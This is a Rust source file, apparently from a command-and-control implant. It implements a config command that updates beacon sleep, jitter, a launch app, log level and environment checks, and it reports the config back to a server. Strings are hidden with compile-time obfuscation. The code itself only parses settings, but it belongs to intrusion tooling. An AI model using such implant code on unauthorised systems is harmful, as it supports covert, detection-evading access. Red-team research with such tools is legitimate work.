use std::error::Error;
use litcrypt::lc;
use serde_json;
use crate::logger::{Logger, log_out};
use crate::cmd::{CommandArgs, ConfigOptions, ConfigOption, command_out};

/// Does the actual work of updating the config.
/// 
/// Uses the `ConfigOption` enum from the `config` module
/// to handle parsing of the commands.
async fn update_config(config_key: &str, config_val: &str, config_options: &mut ConfigOptions) -> Result<String, String> {
    if let Ok(v) = match config_key {
        // "api_key" => Ok(ConfigOption::ApiKey(config_val.to_string())),
        // "parent_page" => Ok(ConfigOption::ParentPage(config_val.to_string())),
        "sleep" => match config_val.parse::<u64>() {
            Ok(v) => Ok(ConfigOption::Sleep(v)),
            Err(_) => Err(())
        },
        "jitter" => match config_val.parse::<u64>() {
            Ok(v) => Ok(ConfigOption::Jitter(v)),
            Err(_) => Err(())
        },
        "launch_app" => match config_val.parse::<String>() {
            Ok(v) => Ok(ConfigOption::LaunchApp(v)),
            Err(_) => Err(())
        },
        "log_level" => match config_val.parse::<u64>() {
            Ok(v) => Ok(ConfigOption::LogLevel(v)),
            Err(_) => Err(())
        },
        "config_file_path" => Ok(ConfigOption::ConfigPath(config_val.to_string())),
        "env_checks" => match serde_json::from_str(config_val) {
            Ok(v) => Ok(ConfigOption::EnvChecks(v)),
            Err(_) => Err(())
        },
        _ => Err(())
    } {
        match v {
            // ConfigOption::ApiKey(v) => { config_options.api_key = v;},
            // ConfigOption::ParentPage(v) => { config_options.parent_page_id = v;},
            ConfigOption::Sleep(v) => { config_options.sleep_interval = v;},
            ConfigOption::Jitter(v) => { config_options.jitter_time = v;},
            ConfigOption::LaunchApp(v) => { config_options.launch_app = v;},
            ConfigOption::LogLevel(v) => { config_options.log_level = v;},
            ConfigOption::ConfigPath(v) => { config_options.config_file_path = v;},
            ConfigOption::EnvChecks(v) => { config_options.env_checks = v },
            ConfigOption::ChannelType(v) => { config_options.channel_type = v },
        };
        Ok(lc!("Updated!"))
    } else {
        Err(lc!("Unknown config option!"))
    }
}

/// With no arguments, returns the config options as data to 
/// the server.
/// 
/// Usage: `sleep [CONFIG_ARG] [CONFIG_VALUE]`
pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {

    match cmd_args.nth(0) {
        Some(arg) => {
            if let Some(val) = cmd_args.nth(0) {
                match update_config(&arg, &val, config_options).await {
                    Ok(_) => command_out!("Config Item Updated:", &arg.to_string(), ", New Value:", &val.to_string()),
                    Err(e) => Ok(e)
                }
            } else {
                command_out!("No value provided for option", &arg.to_string())
            }
        },
        None => {
            let config_json = serde_json::to_string(config_options)?;
            return Ok(config_json.to_owned()); 
        }
    }
}